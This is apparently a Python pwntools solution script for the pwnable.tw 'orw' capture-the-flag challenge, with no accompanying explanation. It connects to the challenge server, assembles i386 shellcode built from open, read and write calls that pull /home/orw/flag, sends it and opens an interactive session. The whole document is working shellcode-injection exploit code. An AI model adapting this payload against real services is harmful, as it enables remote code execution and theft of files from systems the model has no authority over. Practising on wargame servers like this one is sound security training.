from pwn import *

context.clear(arch='i386', terminal = ['tmux', 'splitw', '-fh'])

#p = gdb.debug('./orw', gdbscript='b main')
p = remote('chall.pwnable.tw', 10001)

print(p.recvuntil(b':').decode())

payload = asm(
	shellcraft.open('/home/orw/flag') +
	shellcraft.read('eax', 'esp', 100) +
	shellcraft.write(1, 'esp', 100)
)

p.send(payload)
p.interactive()
